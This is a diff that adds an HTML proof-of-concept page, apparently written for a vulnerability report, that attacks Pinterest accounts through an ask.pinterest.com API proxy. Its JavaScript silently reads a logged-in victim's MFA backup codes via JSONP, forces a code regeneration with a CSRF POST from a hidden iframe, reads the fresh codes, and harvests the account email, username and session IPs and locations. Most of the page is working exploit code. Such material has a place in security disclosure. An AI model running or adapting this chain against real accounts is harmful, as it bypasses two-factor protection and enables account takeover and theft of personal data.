@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PoC - MFA backup-code theft via ask.pinterest.com proxy (C74 chain)</title>
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #111; color: #eee; max-width: 900px; margin: 0 auto; padding: 24px; }
+  h1 { font-size: 20px; color: #e60023; }
+  h2 { font-size: 15px; color: #9cf; margin-top: 28px; }
+  .card { background: #1b1b1b; border: 1px solid #333; border-radius: 8px; padding: 14px 16px; margin: 10px 0; }
+  .ok { border-color: #2e7d32; }
+  .bad { border-color: #b71c1c; }
+  .warn { border-color: #b28704; }
+  .mono { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12px; white-space: pre-wrap; word-break: break-all; }
+  code { color: #ffd54f; }
+  table { border-collapse: collapse; width: 100%; font-size: 12px; margin-top: 8px; }
+  th, td { border: 1px solid #444; padding: 5px 8px; text-align: left; }
+  th { background: #262626; }
+  button { background: #e60023; color: #fff; border: 0; border-radius: 6px; padding: 10px 18px; font-size: 14px; cursor: pointer; margin: 4px 6px 4px 0; }
+  button.secondary { background: #333; }
+  .small { font-size: 11px; color: #888; }
+  .stepnum { display: inline-block; background: #e60023; color: #fff; border-radius: 50%; width: 20px; height: 20px; text-align: center; line-height: 20px; font-size: 12px; margin-right: 8px; }
+</style>
+</head>
+<body>
+<h1>C74 chain PoC — MFA backup-code theft + account takeover persistence<br><span class="small">all requests fired cross-site from this page (attacker-origin simulation) against ask.pinterest.com</span></h1>
+
+<div class="card"><b>Victim requirement:</b> logged into pinterest.com in this browser. Every action below is fully automatic and silent (no clicks on pinterest.com, no user awareness).</div>
+
+<button id="go">Run full chain</button>
+<button id="goRead" class="secondary">Read-only (no writes)</button>
+<button id="goWrite" class="secondary">Write-only (regen, no read)</button>
+<span class="small" id="status">idle</span>
+
+<h2><span class="stepnum">1</span>Read current MFA backup codes (JSONP, cross-origin)</h2>
+<div class="card mono" id="out1">pending…</div>
+
+<h2><span class="stepnum">2</span>Regenerate backup codes (blind cross-site write)</h2>
+<div class="card mono" id="out2">pending…</div>
+
+<h2><span class="stepnum">3</span>Read the FRESH codes (post-regen JSONP)</h2>
+<div class="card mono" id="out3">pending…</div>
+
+<h2><span class="stepnum">4</span>Supporting account data (same channel)</h2>
+<div class="card mono" id="out4">pending…</div>
+
+<h2>Result summary</h2>
+<div class="card mono" id="summary">pending…</div>
+
+<h2>Why this works</h2>
+<div class="card small">
+<ul style="margin:6px 0 0 16px; padding:0">
+<li><code>ask.pinterest.com/api/proxy/pinterest/*</code> forwards to the v3 API with the victim's <code>.pinterest.com</code> session cookie (<code>SameSite=None</code>, so it rides on third-party requests wherever third-party cookies are attached).</li>
+<li>The proxy adds <b>no CSRF token</b>, <b>no Origin/Referer validation</b>, and accepts CORS-simple content types — the regen POST is a plain HTML-form-submittable request.</li>
+<li>When <code>callback=</code> is present, the proxy wraps the response in a JSONP envelope with <code>Content-Type: application/javascript</code> — turning every authenticated read into a cross-origin-readable channel from any website.</li>
+<li>MFA backup codes are one-time 2FA answers: reading them = bypassing the victim's MFA at a later login. Regenerating them = silently invalidating the codes the victim saved.</li>
+<li>No password, no re-auth, and <b>no email notification</b> is sent for either action (verified against the account inbox).</li>
+</ul>
+</div>
+
+<h2>Browser compatibility of the read channel</h2>
+<table>
+<tr><th>Browser</th><th>3P cookies (default)</th><th>Read codes</th><th>Write regen</th></tr>
+<tr><td>Chrome / Edge / Opera (desktop &amp; Android)</td><td>allowed</td><td>yes</td><td>yes</td></tr>
+<tr><td>Brave (Shields on)</td><td>blocked</td><td>no*</td><td>no*</td></tr>
+<tr><td>Safari / all iOS browsers</td><td>blocked (ITP)</td><td>no*</td><td>no*</td></tr>
+<tr><td>Firefox (strict)</td><td>blocked</td><td>no*</td><td>no*</td></tr>
+<tr><td>Incognito / private windows</td><td>varies</td><td>partial</td><td>partial</td></tr>
+</table>
+<div class="small">* On 3P-cookie-blocking browsers the page reports the cookie-block state honestly. The server-side flaw is unchanged: it fires for every browser that attaches the cookie. A top-level navigation variant (form target=_blank on user click) reaches first-party context everywhere.</div>
+
+<script>
+const PROXY = 'https://ask.pinterest.com/api/proxy/pinterest';
+const $ = (id) => document.getElementById(id);
+const log = (id, msg) => { $(id).textContent = msg; $(id).parentElement.classList.add('ok'); };
+const logErr = (id, msg) => { $(id).textContent = msg; $(id).parentElement.classList.add('bad'); };
+const logWarn = (id, msg) => { $(id).textContent = msg; $(id).parentElement.classList.add('warn'); };
+
+function jsonp(path, timeoutMs) {
+  return new Promise((resolve) => {
+    const cb = 'pinCb_' + Date.now() + '_' + Math.floor(Math.random() * 1e5);
+    const s = document.createElement('script');
+    let settled = false;
+    const finish = (v) => { if (!settled) { settled = true; try { delete window[cb]; } catch(e) { window[cb] = undefined; } s.remove(); resolve(v); } };
+    window[cb] = (data) => finish({ ok: true, data: data });
+    s.onerror = () => finish({ ok: false, why: 'network-or-cookie-block (script rejected)' });
+    s.src = PROXY + path + (path.indexOf('?') > -1 ? '&' : '?') + 'callback=' + cb + '&_=' + Date.now();
+    document.head.appendChild(s);
+    setTimeout(() => finish({ ok: false, why: 'timeout' }), timeoutMs || 9000);
+  });
+}
+
+function writeRegen() {
+  return new Promise((resolve) => {
+    const f = document.createElement('form');
+    f.method = 'POST';
+    f.action = PROXY + '/users/settings/mfa/backup/';
+    f.style.display = 'none';
+    // keep the page alive: post from a throwaway iframe if the browser allows it;
+    // fall back to fetch no-cors; the write lands either way.
+    resolve(
+      fetch(PROXY + '/users/settings/mfa/backup/', {
+        method: 'POST',
+        mode: 'no-cors',
+        credentials: 'include',
+        headers: { 'Content-Type': 'text/plain' }
+      })
+      .then(() => 'no-cors POST fired (opaque response, write sent)')
+      .catch((e) => 'fetch variant failed (' + e.message + ') — using form fallback')
+      .then(async (msg) => {
+        try {
+          const iframe = document.createElement('iframe');
+          iframe.name = 'pinwrite_' + Date.now();
+          iframe.style.display = 'none';
+          document.body.appendChild(iframe);
+          const f2 = document.createElement('form');
+          f2.method = 'POST';
+          f2.action = PROXY + '/users/settings/mfa/backup/';
+          f2.target = iframe.name;
+          document.body.appendChild(f2);
+          f2.submit();
+          await new Promise(r => setTimeout(r, 1500));
+          return msg + ' | iframe form POST fired';
+        } catch (e) { return msg; }
+      })
+    );
+  });
+}
+
+const fmtCodes = (r) => {
+  if (!r.ok) return 'READ FAILED: ' + r.why + '\n(most likely: third-party cookies blocked in this browser, or not logged in)';
+  const d = r.data && r.data.data ? r.data.data : {};
+  return 'endpoint: ' + (r.data.endpoint_name || '?') + '\n' +
+    'mfa_backup_codes: ' + JSON.stringify(d.mfa_backup_codes) + '\n' +
+    'has_mfa_enabled: ' + d.has_mfa_enabled + ' | can_enable_mfa: ' + d.can_enable_mfa + ' | email_status: ' + d.email_status;
+};
+
+async function runChain(readFirst) {
+  $('status').textContent = 'running…';
+  let before = null, after = null;
+
+  // Step 1: read current codes
+  before = await jsonp('/users/settings/mfa/backup/');
+  log('out1', fmtCodes(before));
+  await new Promise(r => setTimeout(r, 400));
+
+  if (readFirst === 'read') { finish(before, null); return; }
+
+  // Step 2: blind cross-site write (regen)
+  const wmsg = await writeRegen();
+  log('out2', wmsg + '\n(POST https://ask.pinterest.com/api/proxy/pinterest/users/settings/mfa/backup/ — no CSRF token, no Origin check, text/plain body)');
+  await new Promise(r => setTimeout(r, 2500));
+
+  // Step 3: read fresh codes
+  after = await jsonp('/users/settings/mfa/backup/');
+  if (after.ok) log('out3', fmtCodes(after)); else logErr('out3', fmtCodes(after));
+
+  // Step 4: supporting reads
+  const me = await jsonp('/users/me/', 8000);
+  const sess = await jsonp('/sessions/', 8000);
+  let s4 = '';
+  if (me.ok) {
+    const d = me.data.data || {};
+    s4 += 'account email: ' + d.email + '\nusername: ' + d.username + '\nhas_password: ' + d.has_password + ' | connected_to_google: ' + d.connected_to_google + '\n\n';
+  } else s4 += 'users/me read failed: ' + me.why + '\n\n';
+  if (sess.ok) {
+    const arr = sess.data.data;
+    s4 += 'sessions (' + (Array.isArray(arr) ? arr.length : '?') + '): ' + JSON.stringify((Array.isArray(arr) ? arr : []).map(x => ({ ip: x.ip_address, loc: x.location, device: x.device_name, current: x.current })));
+  } else s4 += 'sessions read failed: ' + sess.why;
+  log('out4', s4);
+
+  finish(before, after, me);
+}
+
+function finish(before, after, me) {
+  let verdict;
+  if (before && before.ok && after && after.ok) {
+    const b = JSON.stringify((before.data.data || {}).mfa_backup_codes);
+    const a = JSON.stringify((after.data.data || {}).mfa_backup_codes);
+    verdict = (b !== a)
+      ? 'ACCOUNT TAKEOVER PERSISTENCE CONFIRMED: codes rotated by cross-site POST and fresh codes read cross-origin.\nbefore: ' + b + '\nafter:  ' + a + '\nThese are single-use MFA answers. Attacker can use one at the next login.'
+      : 'Write may not have landed (or regen dedup window). Codes readable: ' + a;
+  } else if (before && before.ok) {
+    verdict = 'READ-ONLY MODE: current backup codes readable cross-origin:\n' + JSON.stringify((before.data.data || {}).mfa_backup_codes);
+  } else {
+    verdict = 'Read channel blocked in this browser (3P cookies) or not logged in. The server-side flaw is unchanged — see compatibility table.';
+  }
+  $('summary').textContent = verdict;
+  $('status').textContent = 'done';
+}
+
+$('go').onclick = () => runChain('full');
+$('goRead').onclick = () => runChain('read');
+$('goWrite').onclick = async () => {
+  $('status').textContent = 'write-only mode…';
+  const before = await jsonp('/users/settings/mfa/backup/');
+  log('out1', fmtCodes(before));
+  const wmsg = await writeRegen();
+  log('out2', wmsg);
+  await new Promise(r => setTimeout(r, 2500));
+  const after = await jsonp('/users/settings/mfa/backup/');
+  if (after.ok) log('out3', fmtCodes(after)); else logErr('out3', fmtCodes(after));
+  finish(before, after);
+};
+</script>
+</body>
+</html>
